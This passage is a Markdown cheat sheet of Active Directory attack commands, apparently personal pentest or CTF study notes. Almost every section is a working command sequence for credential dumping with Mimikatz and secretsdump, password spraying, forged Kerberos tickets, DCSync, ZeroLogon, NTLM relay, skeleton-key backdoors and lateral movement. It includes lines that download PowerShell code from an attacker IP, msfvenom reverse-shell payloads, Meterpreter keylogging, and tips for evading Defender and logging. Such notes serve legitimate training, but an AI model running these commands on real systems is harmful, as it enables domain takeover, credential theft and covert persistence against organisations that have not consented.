- `ldapsearch -v -c -D <username>@<domain> -w <password> -b "DC=<domain>,DC=<local>" -H ldap://<IP> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  - to find Administrator password
  - using creds `<username>:<password>` for domain `<domain>`
- `ldapdomaindump -u '<domain>\\<username>' -p <password> <IP> -o ~/Downloads/ldap/`

Domain Enumeration
1. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "<username>" --dc-ip <DC_IP>`
2. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "<username>" --dc-ip <DC_IP> -U --admin-objects`
   - Use the flag `--full` to get full results
3. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "<username>" --dc-ip <DC_IP> -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt`
- You can also see which elements belong in a group
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "<username>" --dc-ip <DC_IP> -U -m "Remote Management Users"`
- Find possible passwords
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "<username>" --dc-ip <DC_IP> -U --full | grep 'Pwd'`

## PsLoggedOn

Download: [PsLoggedOn - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon)
```
.\PsLoggedon.exe \\COMPUTERNAME       See user logons at COMPUTERNAME
```

## Service Principal Names Enumeration

```
setspn -L <username>                                                List the SPNs connected to a certain user account
Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPNs accounts in the domain
```

## Object Permissions Enumeration=

```
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
```

## Domain Shares Enumeration

```
Find-DomainShare       Find Domain Shares
```

## SharpHound
```
Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
Invoke-Bloodhound -CollectionMethod All -Domain <domain_name> -ZipFileName <file_name>.zip
```

Alternatives
- `python3 /home/kali/Documents/windows-attack/Scripts/BloodHound.py/bloodhound.py -d <domain_name> -u <username> -p <password> -c all -ns <IP>`
- `.\SharpHound.exe -c All -d <domain_name> --zipfilename <filename>.zip`
- `SharpHound.exe --CollectionMethods All --Domain <domain_name> --ExcludeDCs`

Notes:
- If you don’t need to worry about repercussion, just use: `Invoke-BloodHound -CollectionMethod All` or SharpHound.exe
- If you are in a Red Team operation, use:
  - `Invoke-BloodHound -Stealth`
  - `SharpHound.exe --stealth`
  - To avoid detections like MDI `Invoke-BloodHound -ExcludeDCs`

## BloodHound

- Note: you need to start Neo4j first with `sudo neo4j start` and then use the command `bloodhound` to start BloodHound.
- Default credentials for Neo4j: `neo4j:neo4j`
- Log in BloodHound with Neo4j's credentials
- Upload here the zip created with SharpHound
- Pre-built queries
  - Find Workstations where Domain Users can RDP
  - Find Servers where Domain Users can RDP
  - Find Computers where Domain Users are Local Admin
  - Shortest Path to Domain Admins from Owned Principals
- Custom queries
  - `MATCH (m:Computer) RETURN m`  to display all computers
  - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
- Try every query
  - See the groups of the user pwned, query 'Shortest Path to High Value targets'
  - Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
  - Search for the users / machines owned and mark them as it. Then use the query 'Reachable High Value Targets'


## Mimikatz

After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege` and run `token::elevate`
```
sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
sekurlsa::tickets                                                                  Tickets stored in memory
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
sekurlsa::msv                                                                      Extracting NTLM hashes from LSASS memory
crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
lsadump::lsa /patch                                                                Dump the hashes
```

Other commands to run
- `log`
- `lsadump::sam`
- `lsadump::secrets`
- `lsadump::cache`
- `lsadump::ekeys`

Notes
- If `privilege::debug` doesn't work, try with:
  - `. .\Invoke-PsUACme.ps1`
  - `Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file C:\temp\mimikatz.exe"`
- You can: steal credentials, generate Kerberos tickets, dump credentials stored in memory and leverage attacks
- A few attacks: Credential dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
- See https://github.com/gentilkiwi/mimikatz/wiki
- The first thing to do is always to run `privilege::debug`
- See: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- With mimikatz you can turn on the feature widgets. It enables you to see then password in plain text for users that logon and log off
- See also `Invoke-Mimikatz`
- Use `/patch` with a command, it might work
   - esempio: `lsadump::sam /patch`
- https://adsecurity.org/?page_id=1821
- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts


## Active Directory Authentication Attacks

### Password Attacks

With LDAP and ADSI
- Before any attack, check `net accounts` to learn more about account lockouts
- Use the script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
  - Search wich user has the password `SecretPass123!` with `.\Spray-Passwords.ps1 -Pass SecretPass123! -Admin`
  - Remember to run `powershell -ep bypass` before using scripts

Leveraging SMB
- `crackmapexec smb <IP> -u users.txt -p '<password>' -d <domain-name> --continue-on-success` Password spraying
- `crackmapexec smb <domain_name>/<username>:'<password>' -M targets.txt` Spray a specified password against all domain joined machines contained in `targets.txt`
- Note: this doesn't take into consideration the password policy of the domain

By obtaining a TGT
- It's possible to use kinit to obtain and cache a Kerberos TGT and automate the process with a script
- It's also possible to use [kerbrute](https://github.com/ropnop/kerbrute) instead
  - `.\kerbrute_windows_amd64.exe passwordspray -d <domain-name> .\usernames.txt "<password>"`

### Silver Tickets

To create a silver ticket, you need:
- SPN password hash
- Domain SID
- Target SPN

1. With mimikatz, run the commands `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials. Note the NTLM hash of the target user
2. Run on the PowerShell the command `whoami /user` to obtain the domain SID (omit the last 4 digits). Note: you should be able to find it also in the previous step
3. Target an SPN
4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
5. Confirm that you have the ticket ready to use in memory with `klist`

**Another way to do it**
1. `impacket-ticketer -nthash <NT_hash> -domain-sid <domain_SID> -domain <domain_name> -spn MSSQL/<server_FQDN> -user-id <user_ID> <user_name>`
2. `export KRB5CCNAME=$PWD/<ticket_file>`
3. `klist`
4. `sudo nano /etc/krb5user.conf`
5. `sudo echo '<IP_address> localhost <server_FQDN> <DOMAIN_NAME>' >> /etc/hosts`
6. `impacket-mssqlclient -k <server_FQDN>`
   - `select system_user;`
   - `SELECT * FROM OPENROWSET (BULK '<file_path>', SINGLE_CLOB) as correlation_name;`


- Requirement: running in the context of service user (example `svc_mssql`)
- MSSQL, verify if it's running in the context of service user
  1. from kali: `impacket-smbserver -smb2support <share_name> /path/to/share_directory`
  2. from mssql: `exec xp_dirtree '\\ATTACKER_IP\<share_name>'`
  3. from `impacket-smbserver`, see the user that tried to authenticate
  - See '<Service_User>' from PG as an example
- If you have a password, you can generate an NTHASH: <NT_hash_generator_link>
  - There are many tools for this purpose

### Domain Controller Synchronization (DCSync)

With Bloodhound, use the query 'Find Principals with DCSync Rights'
- Another way to see which user can DCSync is to see who possesses 'Replication Rights' with PowerView.ps1
  - `Get-ObjectACL "<LDAP_Path>" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }`

On Linux
1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

On Windows
1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

Another way
- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t <target_domain> --domain <domain> --server <IP> -du <domain_user> -dp <domain_password>`

Connect with NTLM
- `evil-winrm -u Administrator -H '<NTLM_hash>' -i <IP> -N`
- `impacket-psexec <domain>/administrator@<IP> -hashes <NTLM_hash>`


### LDAP Pass-back attack

If you find an endpoint where you can connect back to an arbitrary LDAP server
- run `nc -vlp 389`
- Host a Rogue LDAP Server
  1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  2. `sudo dpkg-reconfigure -p low slapd`
  3. `nano olcSaslSecProps.ldif`
  4. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
  5. Verify it: `ldapsearch -H ldap://<IP> -x -LLL -s base -b "" supportedSASLMechanisms`


### ZeroLogon

- Explanation of ZeroLogon: [TryHackMe - ZeroLogon](https://tryhackme.com/room/zer0logon)

STEP 1, CHOOSE ONE EXPLOIT
- `python3 '/path/to/set_empty_pw.py' <target_DC> <attacker_IP>`
- `python3 '/path/to/zerologon_tester.py' <target_DC> <attacker_IP>`

STEP 2
- `impacket-secretsdump -hashes :<empty_ntlm_hash> '<DOMAIN>/<MACHINE>$@<target_IP>'`
- `impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:<empty_ntlm_hash> '<DOMAIN>/<MACHINE>$@<target_IP>'`
  - Replace placeholders accordingly:
    - `<target_DC>`: IP address or hostname of the target domain controller
    - `<attacker_IP>`: IP address of the attacker machine
    - `<DOMAIN>`: The domain name
    - `<MACHINE>`: The machine account name
    - `<target_IP>`: IP address of the target machine
    - `<empty_ntlm_hash>`: The empty NTLM hash (usually 31d6cfe0d16ae931b73c59d7e0c089c0)
  - Once secrets are dumped, select users with the following command:
    - `awk -F: '{print $1}' hashes.txt | sort | uniq`

STEP 3
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- Use also a pass the hash attack for Administrator:
  - `impacket-psexec -hashes <NTLM_hash>:<empty_ntlm_hash> Administrator@<target_IP>`

STEP 4
- RESTORATION: [CVE-2020-1472 - Restore Steps](https://github.com/dirkjanm/CVE-2020-1472#restore-steps)


### Responder SSRF

- Setup Responder to create a spoofed WPAD proxy server
  - `sudo responder -I tun0 -wv`
  
  
### LAPS and PXE

- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
2. `Import-Module .\PowerPXE.ps1`
3. `$BCDFile = "conf.bcd"`
4. `Get-WimFile -bcdFile $BCDFile`
5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
6. `Get-FindCredentials -WimFile pxeboot.wim`


### LLMNR Poisoning

- It is possible that when you run nmap, or simply have traffic, you may receive communications. Use responders to capture hashes
1. `sudo responder -I tun0 -rdwv`
2. Listen to the traffic
3. Get the hash
4. crack the hash
   - `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -O`


### SMB Relay

- Requirements for attack: SMB signing must be disabled on the target; Relayed user credentials must be admin on the machine.
  - Discovery: `nmap --script=smb2-security-mode.nse -p445 <target_network>`
1. Turn off SMB and HTTP from the file `/usr/share/responder/Responder.conf`
2. `sudo responder -I <interface> -rdwv`
3. `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
   - Add the flag `-i` to get an interactive SMB shell; connect with netcat `nc 127.0.0.1 1100`
   - Add the flag `-c` to run a command, like `whoami`
   - Add the flag `-e` to execute something, like a payload generated with msfvenom
4. Capture SAM hashes


### IPv6 DNS Attacks

1. `mitm6 -d <domain>`
2. `sudo impacket-ntlmrelayx -6 -t ldaps://<domain_controller_ip> -wh <fake_wpad_hostname> -l <output_directory>`
   - `-t ldaps://<domain_controller_ip>`: Replace `<domain_controller_ip>` with the IP address of the domain controller.
   - `-wh <fake_wpad_hostname>`: Replace `<fake_wpad_hostname>` with the hostname you want to use for the fake WPAD server.
   - `-l <output_directory>`: Replace `<output_directory>` with the directory where you want to save the results.
3. Check the results in the directory specified by `<output_directory>` for ntlmrelayx.
4. If an admin logs in, it might succeed in creating a new user.


### MFP Hacking

- See: [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)


### Dump hashes

- `impacket-secretsdump <domain>/<username>:<password>@<target_ip>`
- `impacket-secretsdump -ntds <ntds_file> -system <system_file> LOCAL`
  - `<ntds_file>`: Path to the NTDS.dit file.
  - `<system_file>`: Path to the SYSTEM hive file.
    - `SYSTEM` or `system.hive`
- Alternatively, you can run:
  1. `impacket-secretsdump -ntds <ntds_file> -system <system_file> LOCAL > hashes.txt`
  2. `cat hashes.txt | cut -d ':' -f 4 > pothashes.txt`
  3. `gedit pothashes.txt`


### Microsoft password automation decrypt

1. `$pw = "<encrypted_password>" | ConvertTo-SecureString`
2. `$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)`
3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)`
4. `echo $UnsecurePassword`


### Full control / Write privileges over a template (ESC4)

1. `certipy-ad req -username <username> -password '<password>' -target <target_domain> -ca <ca_name> -template <template_name> -upn <upn> -dc-ip <dc_ip> -debug`
2. `certipy-ad auth -pfx administrator.pfx -domain <target_domain> -username administrator -dc-ip <dc_ip>`


### WriteDACL

- If you find that your user or the group which your user is part of has this right, follow these steps
1. `net user <username> <password> /add /domain`
2. `net group "Exchange Windows Permissions" <username> /add`
3. `net localgroup "Remote Management Users" <username> /add`
4. When using evil-winrm, run the command 'Bypass-4MSI' to evade defender
5. `iex(new-object net.webclient).downloadString('http://<attacker_ip>/PowerView.ps1')`
6. `$pass = convertto-securestring '<password>' -asplain -force`
7. `$cred = new-object system.management.automation.pscredential('<domain>\<username>', $pass)`
8. `Add-ObjectACL -PrincipalIdentity <username> -Credential $cred -Rights DCSync`
9. Proceed with DCSync using `<username>:<password>`


### Azure AD (AAD) Sync service

- See: 
  - https://blog.xpnsec.com/azuread-connect-for-redteam/
  - https://github.com/dirkjanm/adconnectdump
  - https://app.hackthebox.com/machines/223
1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
   - `sqlcmd -S SQLSERVER01 -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`


### Group Policy Preferences (GPP) AKA MS14-025

1. `smbclient \\\\<IP>\\Replication`
2. `prompt off`
3. `recurse on`
4. `mget *`
   - focus on the files: `Groups.xml`, `Registry.pol`, `GPE.INI`, `GptTmpl.inf`
     - use the command `tree` to explore better the directory
- `gpp-decrypt <cpassword_value>`
- read Registry.pol
  - `regpol Registry.pol`
  - `Parse-PolFile -Path Registry.pol`


### Dump NTDS.dit

- No creds, access on DC: `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full <output_directory>' q q"`
  - `root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`
- Disk shadow, see: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow
- With credentials: `impacket-secretsdump -just-dc-ntlm <domain>/<username>@<DC_IP>`
- More: https://www.hackingarticles.in/credential-dumping-ntds-dit/



### Exploiting Domain Trust

1. With mimikatz, recover the KRBTGT password hash
   - `privilege::debug`
   - `lsadump::dcsync /user:<domain>\krbtgt`
2. With PowerShell, recover the SID of the child domain controller
   - `Get-ADComputer -Identity "<child_DC_name>"`
3. With PowerShell, recover the SID of the Enterprise Admins
   - `Get-ADGroup -Identity "Enterprise Admins" -Server <root_DC_FQDN>`
4. With mimikatz, create forged TGT
   - `kerberos::golden /user:Administrator /domain:<child_domain> /sid:<SID_of_child_domain> /service:krbtgt /rc4:<Password_hash_of_krbtgt_user> /sids:<SID_of_Enterprise_Admins_group> /ptt`
5. Verify the golden ticket > after that you can use Rubeus.exe
   - `dir \\<child_DC_FQDN>\c$`
   

### AddMember + ForceChangePassword

1. Add our AD account to the IT Support group
   - `Add-ADGroupMember "IT Support" -Members "<Your_AD_Account_Username>"`
   - Verify the result with: `Get-ADGroupMember -Identity "IT Support"`
   - At this point you should have inherited 'ForceChangePassword' Permission Delegation
2. Identify the members of the group to select a target. Since the network is shared, it might be best to select one further down in the list
   - `Get-ADGroupMember -Identity "Tier 2 Admins"`  
3. `$Password = ConvertTo-SecureString "<New_Password_For_User>" -AsPlainText -Force`
   - `Set-ADAccountPassword -Identity "<AD_Account_Username_Of_Target>" -Reset -NewPassword $Password`

- If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run 'gpupdate /force' and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
- See [Exploiting AD Task 2](https://tryhackme.com/room/exploitingad)


### Automated Relays

- With BloodHound, find instances where a computer has the "AdminTo" relationship over another computer
  - `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
- A requirement is SMB signing enabled, check it with the following command
  - `nmap --script=smb2-security-mode -p445 <target_server1_ip> <target_server2_ip>`
Abuse Print Spooler Service
- Determine if the Print Spooler service is running
  - `GWMI Win32_Printer -Computer <target_server>`
- Set up NTLM relay
  - `impacket-ntlmrelayx -smb2support -t smb://<target_server1_ip> -debug`
  - `impacket-ntlmrelayx -smb2support -t smb://<target_server1_ip> -c 'whoami /all' -debug`
- `SpoolSample.exe <target_server2_ip> "<attacker_ip>"`

Keylogging

1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<exploit_ad_ip> LPORT=<listening_port> -f psh -o shell.ps1`
2. `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <exploit_ad_ip>; set LPORT <listening_port>; exploit"`

From the victim
1. `certutil.exe -urlcache -split -f http://<IP>/shell.ps1`

From Meterpreter
1. `ps | grep "explorer"`
2. `migrate PID`
3. `getuid`
4. `keyscan_start`
5. `keyscan_dump`


### GenericAll

[GenericAll on user](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
1. `. .\PowerView.ps1`
2. `Get-ObjectAcl -SamAccountName <username> | ? {$_.ActiveDirectoryRights -eq "GenericAll"}`
3. See GenericAll also in other ways and for groups

[GenericAll on group](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group)
1. `Get-NetGroup "<group_name>"`
2. `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "<group_dn>"}` 
3. `net group "<group_name>" <username> /add /domain`

Scenario: you can't access a shell with found credentials
1. run `bloodhound.py`
2. if you've found a GenericAll to a group that can PSremote, run the following command from 'ldeep' https://github.com/franc-pentest/ldeep
   - `ldeep ldap -u <username> -p '<password>' -d <domain_name> -s ldap://<domain_controller> add_to_group "<user_dn>" "<group_dn>"`



### Kerberos Delegation

Resourced Based Constrained Delegation attack
- Requirement: GenericAll on system
1. `impacket-addcomputer <domain>/<username> -dc-ip <dc_ip> -hashes <ntlm_hashes> -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
2. `python3 /path/to/rbcd.py -dc-ip <dc_ip> -t <target_dc> -f 'ATTACK' -hashes <ntlm_hashes> <domain>\\<username>`
3. `impacket-getST -spn cifs/<target_dc_fqdn> <domain>/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip <dc_ip>`
4. `export KRB5CCNAME=./Administrator.ccache`
5. `sudo echo '<target_dc_ip> <target_dc_fqdn>' >> /etc/hosts`
6. `impacket-psexec -k -no-pass <target_dc_fqdn> -dc-ip <dc_ip>`

Another way to do it
1. Enumerate available delegations
   - `Import-Module C:\Path\to\PowerView.ps1`
   - `Get-NetUser -TrustedToAuth`
2. Get Administrator role, dump secrets to get passwords for target account
   - `token::elevate`
   - `lsadump::secrets`
3. Exit mimikatz > enter Kekeo
4. Generate a TGT to generate tickets for HTTP and WSMAN services
   - `tgt::ask /user:<svcIIS_user> /domain:<domain_name> /password:<svcIIS_password>`
5. Forge TGS requests for the account we want to impersonate (for HTTP and WSMAN)
   - `tgs::s4u /tgt:TGT_<svcIIS_user>@<DOMAIN>_krbtgt~<domain_name>@<DOMAIN>.kirbi /user:<target_user> /service:http/<target_machine>`
   - `tgs::s4u /tgt:TGT_<svcIIS_user>@<DOMAIN>_krbtgt~<domain_name>@<DOMAIN>.kirbi /user:<target_user> /service:wsman/<target_machine>`
6. Exit Kekeo > Open Mimikatz to import the TGS tickets
   - `privilege::debug`
   - `kerberos::ptt TGS_<target_user>@<DOMAIN>_wsman~<target_machine>@<DOMAIN>.kirbi`
   - `kerberos::ptt TGS_<target_user>@<DOMAIN>_http~<target_machine>@<DOMAIN>.kirbi`
7. Exit mimikatz, run `klist` to verify that everything went fine
8. `New-PSSession -ComputerName <target_machine>`
9. `Enter-PSSession -ComputerName <target_machine>`
10. `whoami`


### Kerberos Backdoors / Kerberos Skeleton

1. `privilege::debug`
2. `misc::skeleton`
Accessing the forest
- the default password is 'mimikatz', some examples:
  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`


### Testing found credentials

- `crackmapexec smb <target_IP> -u usernames.txt -p passwords.txt --continue-on-success`
  - test `impacket-psexec` on success
- `crackmapexec winrm <target_IP> -u users.txt -p passwords.txt --continue-on-success`
  - test `evil-winrm` on success
- `crackmapexec smb <target_IP> -u usernames.txt -H hashes.txt --continue-on-success`
  - test the found hashes
- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
- `xfreerdp /u:<username> /p:<password> /cert:ignore /v:<target_IP>`
- Note for post-exploitation: you might find an `.xml` file like `username.xml`. To test it:
  1. `$Credential = Import-Clixml -Path ./username.xml`
  2. `$Credential.GetNetworkCredential().password`
  - The last command, try it even randomly before saving something in `$credential`, you never know


## Lateral Movement Techniques and Pivoting

- See: https://tryhackme.com/room/lateralmovementandpivoting
- `psexec64.exe \\<MACHINE_IP> -u <USERNAME> -p <PASSWORD> -i cmd.exe`
- `winrs.exe -r:<TARGET_HOSTNAME> cmd`

### WMI and WinRM

1. Create a PSCredential object that stores session's username and password
   ```PowerShell
   $username = '<username>';
   $password = '<password>';
   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
   ```
2. Create a Common Information Model
   ```PowerShell
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $options
   $command = 'calc';
   ```
3. Tie all together with `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

Another lateral movement
- `winrs -r:<target> -u:<username> -p:<password>  "cmd /c hostname & whoami"`
- `winrs -r:<target> -u:<username> -p:<password>  "powershell -nop -w hidden -e <BASE64>"`

**PowerShell remoting / PSRemoting**

```PowerShell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```
- To interact with the session
  - `Enter-PSSession <SESSION-ID>` or
  - `Enter-PSSession -ComputerName <computer_name> -Credential $cred`

More commands
```PowerShell
# Execute commands or scriptblocks
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

# Execute scripts from files
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Execute locally loaded function on the remote machines
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)

# In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList <arguments>

# Below, a function call within the script is used:
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Execute "Stateful" commands using Invoke-Command
$Sess = New-PSSession -Computername <target_server>
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}

# Use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
winrs -remote:<target_server> -u:<username> -p:<password> hostname
```

**Connecting to WMI From Powershell, another process**
- Create a PSCredential object
  ```PowerShell
  $username = '<username>';
  $password = '<password>';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  ```
- Enstablish a connection
  - `Enter-PSSession -Computername <target> -Credential $credential`
  - `Invoke-Command -Computername <target> -Credential $credential -ScriptBlock {whoami}`
  - ```PowerShell
    $Opt = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName <target> -Credential $credential -SessionOption $Opt -ErrorAction Stop
    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
    ```
- Same process done with wmic.exe
  - `wmic.exe /user:<username> /password:<password> /node:<target> process call create "cmd.exe /c calc.exe"`
  - `winrs.exe -u:<username> -p:<password> -r:<target> cmd`
- Create Services Remotely with WMI
  - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "<service_name>";DisplayName = "<display_name>";PathName = "<service_path>";ServiceType = [byte]::Parse("16");StartMode = "Manual" }`
  - `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '<service_name>'"`
  - `Invoke-CimMethod -InputObject $Service -MethodName StartService`
  - Stop and delete service
    ```PowerShell
    Invoke-CimMethod -InputObject $Service -MethodName StopService
    Invoke-CimMethod -InputObject $Service -MethodName Delete
    ```

**Creating Scheduled Tasks Remotely with WMI**
- ```PowerShell
  $Command = "<command>"
  $Args = "<arguments>"
  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
  Register-ScheduledTask -CimSession $Session -Action $Action -User "<user>" -TaskName "<task_name>"
  Start-ScheduledTask -CimSession $Session -TaskName "<task_name>"
  Delete unscheduled task
  ```
- `Unregister-ScheduledTask -CimSession $Session -TaskName "<task_name>"`

**Example with WMI**
1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f msi > myinstaller.msi`
2. `smbclient -c 'put myinstaller.msi' -U <username> -W <domain> '//<target_ip_or_hostname>/admin$/' <password>`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"`
4. ```PowerShell
   $username = '<username>';
   $password = '<password>';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName <target_computer_name> -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```
5. `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Path\to\your\installer.msi"; Options = ""; AllUsers = $false}`

### Remotely Creating Services Using sc
```Powershell
sc.exe \\TARGET create <service_name> binPath= "<command_to_execute>" start= auto
sc.exe \\TARGET start <service_name>
sc.exe \\TARGET stop <service_name>
sc.exe \\TARGET delete <service_name>
```

### Creating Scheduled Tasks Remotely
```Powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "<task_name>" /tr "<command/payload_to_execute>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "<task_name>" 
schtasks /S TARGET /TN "<task_name>" /DELETE /F
```

### Spawn process remotely
1. `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker_ip> LPORT=<attacker_port> -o <output_filename>.exe`
